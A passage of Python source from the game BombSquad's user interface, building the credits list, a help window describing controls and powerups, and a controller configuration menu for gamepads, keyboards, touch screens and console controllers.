            .evaluate().replace('${NAME}', 'the Khronos Group')+'\n'
            '\n'
            '                                       '
            '                      www.froemling.net\n')

        txt = creditsText
        lines = txt.splitlines()
        lineHeight = 20

        scale = 0.55
        self._subWidth = width-80
        self._subHeight = lineHeight * len(lines) + 40

        c = self._subContainer = bs.containerWidget(
            parent=s, size=(self._subWidth, self._subHeight),
            background=False, claimsLeftRight=False, claimsTab=False)

        vOffs = 0
        for line in lines:
            t = bs.textWidget(
                parent=c,
                padding=4,
                color=(0.7, 0.9, 0.7, 1.0),
                scale=scale,
                flatness=1.0,
                size=(0, 0),
                position=(0, self._subHeight-20 + vOffs),
                hAlign='left',
                vAlign='top',
                text=bs.Lstr(value=line))
            vOffs -= lineHeight

    def _back(self):
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        uiGlobals['mainMenuWindow'] = MainMenuWindow(
            transition='inLeft').getRootWidget()


class HelpWindow(Window):

    def __init__(self, mainMenu=False, originWidget=None):

        bsInternal._setAnalyticsScreen('Help Window')

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None
            transition = 'inRight'

        self._r = 'helpWindow'

        self._mainMenu = mainMenu
        width = 950 if gSmallUI else 750
        xOffs = 100 if gSmallUI else 0
        height = 460 if gSmallUI else 530 if gMedUI else 600

        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = False
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=1.77
            if gSmallUI else 1.25 if gMedUI else 1.0, stackOffset=(0, -30)
            if gSmallUI else(0, 15) if gMedUI else(0, 0))

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(0, height - (50 if gSmallUI else 45)),
            size=(width, 25),
            text=bs.Lstr(
                resource=self._r + '.titleText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            color=gTitleColor, hAlign="center", vAlign="top")

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget,
            position=(44 + xOffs, 55 if gSmallUI else 55),
            simpleCullingV=100.0,
            size=(width - (88 + 2 * xOffs),
                  height - 120 + (5 if gSmallUI else 0)),
            captureArrows=True)

        if gToolbars:
            bs.widget(
                edit=self._scrollWidget,
                rightWidget=bsInternal._getSpecialWidget('partyButton'))
        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=self._scrollWidget)

        # ugly: create this last so it gets first dibs at touch events (since
        # we have it close to the scroll widget)
        if gSmallUI and gToolbars:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._close)
            bs.widget(
                edit=self._scrollWidget,
                leftWidget=bsInternal._getSpecialWidget('backButton'))
        else:
            b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(xOffs + (40 + 0 if gSmallUI else 70),
                          height - (59 if gSmallUI else 50)),
                size=(140, 60),
                scale=0.7 if gSmallUI else 0.8, label=bs.Lstr(
                    resource='backText') if self._mainMenu else "Close",
                buttonType='back' if self._mainMenu else None,
                extraTouchBorderScale=2.0, autoSelect=True,
                onActivateCall=self._close)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)

            if self._mainMenu and gDoAndroidNav:
                bs.buttonWidget(
                    edit=b, buttonType='backSmall', size=(60, 55),
                    label=bs.getSpecialChar('back'))

        interfaceType = bs.getEnvironment()['interfaceType']

        self._subWidth = 660
        self._subHeight = 1590 + bsUtils._getResource(
            self._r + '.someDaysExtraSpace') + bsUtils._getResource(
            self._r + '.orPunchingSomethingExtraSpace')

        c = self._subContainer = bs.containerWidget(
            parent=self._scrollWidget, size=(self._subWidth, self._subHeight),
            background=False, claimsLeftRight=False, claimsTab=False)

        spacing = 1.0

        h = self._subWidth*0.5
        v = self._subHeight-55

        logoTex = bs.getTexture('logo')
        iconBuffer = 1.1

        header = (0.7, 1.0, 0.7, 1.0)
        header2 = (0.8, 0.8, 1.0, 1.0)
        paragraph = (0.8, 0.8, 1.0, 1.0)

        txt = bs.Lstr(
            resource=self._r + '.welcomeText',
            subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]).evaluate()
        txtScale = 1.4
        txtMaxWidth = 480
        t = bs.textWidget(
            parent=c, position=(h, v),
            size=(0, 0),
            scale=txtScale, flatness=0.5, resScale=1.5, text=txt,
            hAlign="center", color=header, vAlign="center",
            maxWidth=txtMaxWidth)
        txtWidth = min(txtMaxWidth, bsInternal._getStringWidth(
            txt, suppressWarning=True) * txtScale)

        iconSize = 70
        h2 = h - (txtWidth*0.5+iconSize*0.5*iconBuffer)
        i = bs.imageWidget(parent=c, size=(iconSize, iconSize), position=(
            h2-0.5*iconSize, v-0.45*iconSize), texture=logoTex)

        forceTest = False
        env = bs.getEnvironment()
        if (env['platform'] == 'android'
                and env['subplatform'] == 'alibaba') or forceTest:
            v -= 120.0
            txt = (
                '\xe8\xbf\x99\xe6\x98\xaf\xe4\xb8\x80\xe4\xb8\xaa\xe5\x8f\xaf'
                '\xe4\xbb\xa5\xe5\x92\x8c\xe5\xae\xb6\xe4\xba\xba\xe6\x9c\x8b'
                '\xe5\x8f\x8b\xe4\xb8\x80\xe8\xb5\xb7\xe7\x8e\xa9\xe7\x9a\x84'
                '\xe6\xb8\xb8\xe6\x88\x8f,\xe5\x90\x8c\xe6\x97\xb6\xe6\x94\xaf'
                '\xe6\x8c\x81\xe8\x81\x94 \xe2\x80\xa8\xe7\xbd\x91\xe5\xaf\xb9'
                '\xe6\x88\x98\xe3\x80\x82\n'
                '\xe5\xa6\x82\xe6\xb2\xa1\xe6\x9c\x89\xe6\xb8\xb8\xe6\x88\x8f'
                '\xe6\x89\x8b\xe6\x9f\x84,\xe5\x8f\xaf\xe4\xbb\xa5\xe4\xbd\xbf'
                '\xe7\x94\xa8\xe7\xa7\xbb\xe5\x8a\xa8\xe8\xae\xbe\xe5\xa4\x87'
                '\xe6\x89\xab\xe7\xa0\x81\xe4\xb8\x8b\xe8\xbd\xbd\xe2\x80\x9c'
                '\xe9\x98\xbf\xe9\x87\x8c\xc2\xa0TV\xc2\xa0\xe5\x8a\xa9\xe6\x89'
                '\x8b\xe2\x80\x9d\xe7\x94\xa8 \xe6\x9d\xa5\xe4\xbb\xa3\xe6\x9b'
                '\xbf\xe5\xa4\x96\xe8\xae\xbe\xe3\x80\x82\n'
                '\xe6\x9c\x80\xe5\xa4\x9a\xe6\x94\xaf\xe6\x8c\x81\xe6\x8e\xa5'
                '\xe5\x85\xa5\xc2\xa08\xc2\xa0\xe4\xb8\xaa\xe5\xa4\x96\xe8'
                '\xae\xbe')
            bs.textWidget(parent=c, size=(0, 0),
                          hAlign='center', vAlign='center',
                          maxWidth=self._subWidth * 0.9,
                          position=(self._subWidth * 0.5, v - 180),
                          text=txt)
            bs.imageWidget(
                parent=c, position=(self._subWidth - 320, v - 120),
                size=(200, 200),
                texture=bs.getTexture('aliControllerQR'))
            bs.imageWidget(parent=c, position=(90, v-130), size=(210, 210),
                           texture=bs.getTexture('multiplayerExamples'))
            v -= 120.0

        else:
            v -= spacing * 50.0
            txtScale = 0.66
            txt = bs.Lstr(resource=self._r+'.someDaysText').evaluate()
            t = bs.textWidget(
                parent=c, position=(h, v),
                size=(0, 0),
                scale=1.2, maxWidth=self._subWidth * 0.9, text=txt,
                hAlign="center", color=paragraph, vAlign="center", flatness=1.0)
            v -= (spacing * 25.0
                  + bsUtils._getResource(self._r+'.someDaysExtraSpace'))
            txtScale = 0.66
            txt = bs.Lstr(
                resource=self._r+'.orPunchingSomethingText').evaluate()
            t = bs.textWidget(
                parent=c, position=(h, v),
                size=(0, 0),
                scale=txtScale, maxWidth=self._subWidth * 0.9, text=txt,
                hAlign="center", color=paragraph, vAlign="center", flatness=1.0)
            v -= (spacing * 27.0 + bsUtils._getResource(
                self._r+'.orPunchingSomethingExtraSpace'))
            txtScale = 1.0
            txt = bs.Lstr(
                resource=self._r + '.canHelpText',
                subs=[('${APP_NAME}',
                       bs.Lstr(resource='titleText'))]).evaluate()
            t = bs.textWidget(
                parent=c, position=(h, v),
                size=(0, 0),
                scale=txtScale, flatness=1.0, text=txt, hAlign="center",
                color=paragraph, vAlign="center")

            v -= spacing * 70.0
            txtScale = 1.0
            txt = bs.Lstr(resource=self._r+'.toGetTheMostText').evaluate()
            t = bs.textWidget(
                parent=c, position=(h, v),
                size=(0, 0),
                scale=txtScale, maxWidth=self._subWidth * 0.9, text=txt,
                hAlign="center", color=header, vAlign="center", flatness=1.0)

            v -= spacing * 40.0
            txtScale = 0.74
            txt = bs.Lstr(resource=self._r+'.friendsText').evaluate()
            h2 = h - 220
            t = bs.textWidget(
                parent=c, position=(h2, v),
                size=(0, 0),
                scale=txtScale, maxWidth=100, text=txt, hAlign="right",
                color=header, vAlign="center", flatness=1.0)

            txt = bs.Lstr(
                resource=self._r + '.friendsGoodText',
                subs=[('${APP_NAME}',
                       bs.Lstr(resource='titleText'))]).evaluate()
            txtScale = 0.7
            t = bs.textWidget(
                parent=c, position=(h2 + 10, v + 8),
                size=(0, 0),
                scale=txtScale, maxWidth=500, text=txt, hAlign="left",
                color=paragraph, flatness=1.0)

            env = bs.getEnvironment()

            v -= spacing * 45.0
            txt = bs.Lstr(
                resource=self._r + '.devicesText').evaluate() if(
                env['vrMode']) else bs.Lstr(
                resource=self._r + '.controllersText').evaluate()
            txtScale = 0.74
            h2 = h - 220
            t = bs.textWidget(
                parent=c, position=(h2, v),
                size=(0, 0),
                scale=txtScale, maxWidth=100, text=txt, hAlign="right",
                color=header, vAlign="center", flatness=1.0)

            txtScale = 0.7
            if not env['vrMode']:
                txt = bs.Lstr(
                    resource=self._r+'.controllersInfoText',
                    subs=[('${APP_NAME}', bs.Lstr(resource='titleText')),
                          ('${REMOTE_APP_NAME}', bsUtils._getRemoteAppName())]
                ).evaluate()
            else:
                txt = bs.Lstr(resource=self._r + '.devicesInfoText',
                              subs=[('${APP_NAME}', bs.Lstr(
                                  resource='titleText'))]).evaluate()

            t = bs.textWidget(
                parent=c, position=(h2 + 10, v + 8),
                size=(0, 0),
                scale=txtScale, maxWidth=500, maxHeight=105, text=txt,
                hAlign="left", color=paragraph, flatness=1.0)

        v -= spacing * 150.0

        txt = bs.Lstr(resource=self._r+'.controlsText').evaluate()
        txtScale = 1.4
        txtMaxWidth = 480
        t = bs.textWidget(parent=c, position=(h, v),
                          size=(0, 0),
                          scale=txtScale, flatness=0.5, text=txt,
                          hAlign="center", color=header, vAlign="center",
                          resScale=1.5, maxWidth=txtMaxWidth)
        txtWidth = min(txtMaxWidth, bsInternal._getStringWidth(
            txt, suppressWarning=True) * txtScale)
        iconSize = 70

        h2 = h - (txtWidth*0.5+iconSize*0.5*iconBuffer)
        i = bs.imageWidget(parent=c, size=(iconSize, iconSize), position=(
            h2-0.5*iconSize, v-0.45*iconSize), texture=logoTex)
        v -= spacing * 45.0
        txtScale = 0.7
        txt = bs.Lstr(
            resource=self._r + '.controlsSubtitleText',
            subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]).evaluate()
        t = bs.textWidget(
            parent=c, position=(h, v),
            size=(0, 0),
            scale=txtScale, maxWidth=self._subWidth * 0.9, flatness=1.0,
            text=txt, hAlign="center", color=paragraph, vAlign="center")
        v -= spacing * 160.0

        sep = 70
        iconSize = 100
        iconSize2 = 30
        icon2Offs = 55
        icon2Offs2 = 40

        # to determine whether to show ouya buttons here lets look for actual
        # OUYA hardware (we could be an ouya build running on other hardware)
        ouya = bsInternal._isRunningOnOuya()

        h2 = h - sep
        v2 = v
        i = bs.imageWidget(
            parent=c, size=(iconSize, iconSize),
            position=(h2 - 0.5 * iconSize, v2 - 0.5 * iconSize),
            texture=bs.getTexture('buttonPunch'),
            color=(0.2, 0.6, 1) if ouya else(1, 0.7, 0.3))
        txtScale = bsUtils._getResource(self._r+'.punchInfoTextScale')
        txt = bs.Lstr(resource=self._r+'.punchInfoText').evaluate()
        t = bs.textWidget(
            parent=c, position=(h - sep - 185 + 70, v + 120),
            size=(0, 0),
            scale=txtScale, flatness=1.0, text=txt, hAlign="center",
            color=(0.3, 0.65, 1, 1) if ouya else(1, 0.7, 0.3, 1.0),
            vAlign="top")
        if ouya:
            bs.imageWidget(parent=c, size=(iconSize2, iconSize2), position=(
                h-sep-185+70-66, v+107), texture=bs.getTexture('ouyaUButton'))
        h2 = h + sep
        v2 = v
        i = bs.imageWidget(
            parent=c, size=(iconSize, iconSize),
            position=(h2 - 0.5 * iconSize, v2 - 0.5 * iconSize),
            texture=bs.getTexture('buttonBomb'),
            color=(1, 0.3, 0.3))
        txt = bs.Lstr(resource=self._r+'.bombInfoText').evaluate()
        txtScale = bsUtils._getResource(self._r+'.bombInfoTextScale')
        t = bs.textWidget(
            parent=c, position=(h + sep + 50 + 60, v - 35),
            size=(0, 0),
            scale=txtScale, flatness=1.0, maxWidth=270, text=txt,
            hAlign="center", color=(1, 0.3, 0.3, 1.0),
            vAlign="top")
        if ouya:
            bs.imageWidget(
                parent=c, size=(iconSize2, iconSize2),
                position=(h + sep + 50 - 5, v - 48),
                texture=bs.getTexture('ouyaAButton'))
        h2 = h
        v2 = v + sep
        i = bs.imageWidget(
            parent=c, size=(iconSize, iconSize),
            position=(h2 - 0.5 * iconSize, v2 - 0.5 * iconSize),
            texture=bs.getTexture('buttonPickUp'),
            color=(1, 0.8, 0.3) if ouya else(0.5, 0.5, 1))
        txt = bs.Lstr(resource=self._r+'.pickUpInfoText')
        txtScale = bsUtils._getResource(self._r+'.pickUpInfoTextScale')
        t = bs.textWidget(
            parent=c, position=(h + 60 + 120, v + sep + 50),
            size=(0, 0),
            scale=txtScale, flatness=1.0, text=txt, hAlign="center",
            color=(1, 0.8, 0.3, 1) if ouya else(0.5, 0.5, 1, 1.0), vAlign="top")
        if ouya:
            bs.imageWidget(parent=c, size=(iconSize2, iconSize2), position=(
                h+60+48, v+sep+38), texture=bs.getTexture('ouyaYButton'))
        h2 = h
        v2 = v - sep
        i = bs.imageWidget(
            parent=c, size=(iconSize, iconSize),
            position=(h2 - 0.5 * iconSize, v2 - 0.5 * iconSize),
            texture=bs.getTexture('buttonJump'),
            color=(0.4, 1, 0.4))
        txt = bs.Lstr(resource=self._r+'.jumpInfoText').evaluate()
        txtScale = bsUtils._getResource(self._r+'.jumpInfoTextScale')
        t = bs.textWidget(
            parent=c, position=(h - 250 + 75, v - sep - 15 + 30),
            size=(0, 0),
            scale=txtScale, flatness=1.0, text=txt, hAlign="center",
            color=(0.4, 1, 0.4, 1.0),
            vAlign="top")
        if ouya:
            bs.imageWidget(parent=c, size=(iconSize2, iconSize2), position=(
                h-250+13, v-sep+3), texture=bs.getTexture('ouyaOButton'))

        txt = bs.Lstr(resource=self._r+'.runInfoText').evaluate()
        txtScale = bsUtils._getResource(self._r+'.runInfoTextScale')
        t = bs.textWidget(
            parent=c, position=(h, v - sep - 100),
            size=(0, 0),
            scale=txtScale, maxWidth=self._subWidth * 0.93, flatness=1.0,
            text=txt, hAlign="center", color=(0.7, 0.7, 1.0, 1.0),
            vAlign="center")

        v -= spacing * 280.0

        txt = bs.Lstr(resource=self._r+'.powerupsText').evaluate()
        txtScale = 1.4
        txtMaxWidth = 480
        t = bs.textWidget(
            parent=c, position=(h, v),
            size=(0, 0),
            scale=txtScale, flatness=0.5, text=txt, hAlign="center",
            color=header, vAlign="center", maxWidth=txtMaxWidth)
        txtWidth = min(txtMaxWidth, bsInternal._getStringWidth(
            txt, suppressWarning=True) * txtScale)
        iconSize = 70
        h2 = h - (txtWidth*0.5+iconSize*0.5*iconBuffer)
        i = bs.imageWidget(parent=c, size=(iconSize, iconSize), position=(
            h2-0.5*iconSize, v-0.45*iconSize), texture=logoTex)

        v -= spacing * 50.0
        txtScale = bsUtils._getResource(self._r+'.powerupsSubtitleTextScale')
        txt = bs.Lstr(resource=self._r+'.powerupsSubtitleText').evaluate()
        t = bs.textWidget(
            parent=c, position=(h, v),
            size=(0, 0),
            scale=txtScale, maxWidth=self._subWidth * 0.9, text=txt,
            hAlign="center", color=paragraph, vAlign="center", flatness=1.0)

        v -= spacing * 1.0

        m1 = -270
        m2 = -215
        m3 = 0
        iconSize = 50
        shadowSize = 80
        shadowOffsX = 3
        shadowOffsY = -4
        tBig = 1.1
        tSmall = 0.65

        shadowTex = bs.getTexture('shadowSharp')

        for tex in ['powerupPunch',
                    'powerupShield',
                    'powerupBomb',
                    'powerupHealth',
                    'powerupIceBombs',
                    'powerupImpactBombs',
                    'powerupStickyBombs',
                    'powerupLandMines',
                    'powerupCurse']:
            name = bs.Lstr(resource=self._r+'.'+tex+'NameText')
            desc = bs.Lstr(resource=self._r+'.'+tex+'DescriptionText')

            v -= spacing * 60.0

            i = bs.imageWidget(
                parent=c, size=(shadowSize, shadowSize),
                position=(h + m1 + shadowOffsX - 0.5 * shadowSize,
                          v + shadowOffsY - 0.5 * shadowSize),
                texture=shadowTex, color=(0, 0, 0),
                opacity=0.5)
            i = bs.imageWidget(parent=c, size=(iconSize, iconSize), position=(
                h+m1-0.5*iconSize, v-0.5*iconSize), texture=bs.getTexture(tex))

            txtScale = tBig
            txt = name
            t = bs.textWidget(
                parent=c, position=(h + m2, v + 3),
                size=(0, 0),
                scale=txtScale, maxWidth=200, flatness=1.0, text=txt,
                hAlign="left", color=header2, vAlign="center")
            txtScale = tSmall
            txt = desc
            t = bs.textWidget(
                parent=c, position=(h + m3, v),
                size=(0, 0),
                scale=txtScale, maxWidth=300, flatness=1.0, text=txt,
                hAlign="left", color=paragraph, vAlign="center", resScale=0.5)

    def _close(self):
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if self._mainMenu:
            uiGlobals['mainMenuWindow'] = MainMenuWindow(
                transition='inLeft').getRootWidget()
        global gCanAskToConfigGamePads
        gCanAskToConfigGamePads = True


class ControllersWindow(Window):

    def __init__(self, transition='inRight', originWidget=None):

        self._haveSelectedChild = False

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None

        self._r = 'configControllersWindow'
        env = bs.getEnvironment()

        ua = env['userAgentString']
        interfaceType = env['interfaceType']
        isOuya = bsInternal._isRunningOnOuya()
        isFantasia = bsInternal._isRunningOnFireTV()

        spacing = 50
        buttonWidth = 350
        width = 460
        height = 135

        spaceHeight = spacing*0.3

        showGamepads = False
        platform = env['platform']
        subplatform = env['subplatform']
        # ew.
        if (platform == 'linux' or (
                platform == 'windows' and (
                    subplatform != 'oculus' or env['vrMode'] == False))
                or platform == 'android' or platform == 'mac'):
            showGamepads = True
            height += spacing

        showTouch = False
        if bsInternal._haveTouchScreenInput():
            showTouch = True
            height += spacing

        showSpace1 = False
        if showGamepads or showTouch:
            showSpace1 = True
            height += spaceHeight

        showKeyboard = False
        if bsInternal._getInputDevice(
                'Keyboard', '#1', exceptionOnNone=False) is not None:
            showKeyboard = True
            height += spacing*2
        showKeyboardP2 = False if env['vrMode'] else showKeyboard
        if showKeyboardP2:
            height += spacing

        showSpace2 = False
        if showKeyboard:
            showSpace2 = True
            height += spaceHeight

        showRemote = False
        if True:
            showRemote = True
            height += spacing

        showPS3 = False
        if 'Mac' in ua or isOuya:
            showPS3 = True
            height += spacing

        show360 = False
        if 'Mac' in ua or isOuya or isFantasia:
            show360 = True
            height += spacing

        showMacWiimote = False
        if 'Mac' in ua:
            showMacWiimote = True
            height += spacing

        # on non-oculus-vr windows, show an option to disable xinput
        showXInputToggle = False
        if platform == 'windows' and(
                subplatform != 'oculus' or env['vrMode'] == False):
            showXInputToggle = True

        # on mac builds, show an option to switch between generic and
        # made-for-iOS/Mac systems
        # (we can run into problems where devices register as one of each
        # type otherwise)..
        showMacControllerSubsystemMenu = False
        if platform == 'mac':
            showMacControllerSubsystemMenu = True

        if showMacControllerSubsystemMenu:
            height += spacing

        if showXInputToggle:
            height += spacing

        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition=transition, scaleOriginStackOffset=scaleOrigin,
            scale=(1.7 if showKeyboard else 2.2)
            if gSmallUI else 1.5 if gMedUI else 1.0)
        self._backButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(35, height - 60),
            size=(140, 65),
            scale=0.8, textScale=1.2, autoSelect=True, label=bs.Lstr(
                resource='backText'),
            buttonType='back', onActivateCall=self._back)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)

        # need these vars to exist even if the buttons dont
        self._gamePadsButton = self._touchButton = self._keyboardButton = \
            self._keyboard2Button = self._iDevicesButton = self._ps3Button \
                = self._xbox360Button = self._wiimotesButton = -1

        t = bs.textWidget(
            parent=self._rootWidget, position=(0, height - 49),
            size=(width, 25),
            text=bs.Lstr(resource=self._r + '.titleText'),
            color=gTitleColor, hAlign="center", vAlign="top")
        if gDoAndroidNav:
            bs.buttonWidget(
                edit=b, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        v = height - 75
        v -= spacing

        if showTouch:
            self._touchButton = b = bs.buttonWidget(
                parent=self._rootWidget, position=((width - buttonWidth) / 2, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.configureTouchText'),
                onActivateCall=self._doTouchscreen)
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            if not self._haveSelectedChild:
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=self._touchButton)
                bs.widget(edit=self._backButton, downWidget=self._touchButton)
                self._haveSelectedChild = True
            v -= spacing

        if showGamepads:
            self._gamePadsButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - buttonWidth) / 2 - 7, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.configureControllersText'),
                onActivateCall=self._doGamepads)
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            if not self._haveSelectedChild:
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=self._gamePadsButton)
                bs.widget(edit=self._backButton,
                          downWidget=self._gamePadsButton)
                self._haveSelectedChild = True
            v -= spacing
        else:
            self._gamePadsButton = None

        if showSpace1:
            v -= spaceHeight

        if showKeyboard:
            self._keyboardButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - buttonWidth) / 2 + 5, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.configureKeyboardText'),
                onActivateCall=self._configKeyboard)
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            if not self._haveSelectedChild:
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=self._keyboardButton)
                bs.widget(edit=self._backButton,
                          downWidget=self._keyboardButton)
                self._haveSelectedChild = True
            v -= spacing
        if showKeyboardP2:
            self._keyboard2Button = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - buttonWidth) / 2 - 3, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.configureKeyboard2Text'),
                onActivateCall=self._configKeyboard2)
            v -= spacing
        if showSpace2:
            v -= spaceHeight
        if showRemote:
            self._iDevicesButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - buttonWidth) / 2 - 5, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.configureMobileText'),
                onActivateCall=self._doMobileDevices)
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            if not self._haveSelectedChild:
                bs.containerWidget(edit=self._rootWidget,
                                   selectedChild=self._iDevicesButton)
                bs.widget(edit=self._backButton,
                          downWidget=self._iDevicesButton)
                self._haveSelectedChild = True
            v -= spacing
        if showPS3:
            self._ps3Button = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - buttonWidth) / 2 + 5, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.ps3Text'),
                onActivateCall=self._doPS3Controllers)
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            v -= spacing
        if show360:
            self._xbox360Button = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - buttonWidth) / 2 - 1, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.xbox360Text'),
                onActivateCall=self._do360Controllers)
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            v -= spacing
        if showMacWiimote:
            self._wiimotesButton = b = bs.buttonWidget(
                parent=self._rootWidget,
                position=((width - buttonWidth) / 2 + 5, v),
                size=(buttonWidth, 43),
                autoSelect=True, label=bs.Lstr(
                    resource=self._r + '.wiimotesText'),
                onActivateCall=self._doWiimotes)
            if gToolbars:
                bs.widget(
                    edit=b, rightWidget=bsInternal._getSpecialWidget(
                        'partyButton'))
            v -= spacing

        if showXInputToggle:
            def doToggle(value):
                bs.screenMessage(
                    bs.Lstr(
                        resource='settingsWindowAdvanced.mustRestartText'),
                    color=(1, 1, 0))
                bs.playSound(bs.getSound('gunCocking'))
                bsInternal._setLowLevelConfigValue('enablexinput', not value)
            bs.checkBoxWidget(
                parent=self._rootWidget, position=(100, v + 3),
                size=(120, 30),
                value=not bsInternal._getLowLevelConfigValue(
                    'enablexinput', 1),
                maxWidth=200, onValueChangeCall=doToggle, text=bs.Lstr(
                    resource='disableXInputText'),
                autoSelect=True)
            bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, v - 5),
                size=(0, 0),
                text=bs.Lstr(resource='disableXInputDescriptionText'),
                scale=0.5, hAlign='center', vAlign='center',
                color=gInfoTextColor, maxWidth=width * 0.8)
            v -= spacing

        if showMacControllerSubsystemMenu:
            p = PopupMenu(
                parent=self._rootWidget, position=(260, v - 10),
                width=160, buttonSize=(150, 50),
                scale=1.5, choices=['Classic', 'MFi', 'Both'],
                choicesDisplay=[bs.Lstr(
                    resource='macControllerSubsystemClassicText'),
                    bs.Lstr(
                    resource='macControllerSubsystemMFiText'),
                    bs.Lstr(
                    resource='macControllerSubsystemBothText')],
                currentChoice=bsInternal._getSetting('Mac Controller Subsystem'),
                onValueChangeCall=self._setMacControllerSubsystem)
            bs.textWidget(
                parent=self._rootWidget, position=(245, v + 13),
                size=(0, 0),
                text=bs.Lstr(resource='macControllerSubsystemTitleText'),
                scale=1.0, hAlign='right', vAlign='center',
                color=gInfoTextColor, maxWidth=180)
            bs.textWidget(
                parent=self._rootWidget, position=(width * 0.5, v - 20),
                size=(0, 0),
                text=bs.Lstr(
                    resource='macControllerSubsystemDescriptionText'),
                scale=0.5, hAlign='center', vAlign='center',
                color=gInfoTextColor, maxWidth=width * 0.8)
            v -= spacing

        self._restore_state()

    def _setMacControllerSubsystem(self, val):
        bs.getConfig()['Mac Controller Subsystem'] = val
        bs.writeConfig()
        bs.applySettings()

    def _configKeyboard(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = ConfigKeyboardWindow(
            bsInternal._getInputDevice('Keyboard', '#1')).getRootWidget()

    def _configKeyboard2(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = ConfigKeyboardWindow(
            bsInternal._getInputDevice('Keyboard', '#2')).getRootWidget()

    def _doMobileDevices(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = \
            ConnectMobileDevicesWindow().getRootWidget()

    def _doPS3Controllers(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = \
            ConnectPS3ControllersWindow().getRootWidget()

    def _do360Controllers(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = \
            Connect360ControllersWindow().getRootWidget()

    def _doWiimotes(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = \
            ConfigureWiiRemotesWindow().getRootWidget()

    def _doGamepads(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = \
            ConfigGamePadWindow().getRootWidget()

    def _doTouchscreen(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        uiGlobals['mainMenuWindow'] = \
            ConfigTouchscreenWindow().getRootWidget()

    def _save_state(self):
        sel = self._rootWidget.getSelectedChild()
        if sel == self._gamePadsButton:
            selName = 'GamePads'
        elif sel == self._touchButton:
            selName = 'Touch'
        elif sel == self._keyboardButton:
            selName = 'Keyboard'
        elif sel == self._keyboard2Button:
            selName = 'Keyboard2'
        elif sel == self._iDevicesButton:
            selName = 'iDevices'
        elif sel == self._ps3Button:
            selName = 'PS3'
        elif sel == self._xbox360Button:
            selName = 'xbox360'
        elif sel == self._wiimotesButton:
            selName = 'Wiimotes'
        else:
            selName = 'Back'
        gWindowStates[self.__class__.__name__] = selName

    def _restore_state(self):
        try:
            selName = gWindowStates[self.__class__.__name__]
        except Exception:
            selName = None
        if selName == 'GamePads':
            sel = self._gamePadsButton
        elif selName == 'Touch':
            sel = self._touchButton
        elif selName == 'Keyboard':
            sel = self._keyboardButton
        elif selName == 'Keyboard2':
            sel = self._keyboard2Button
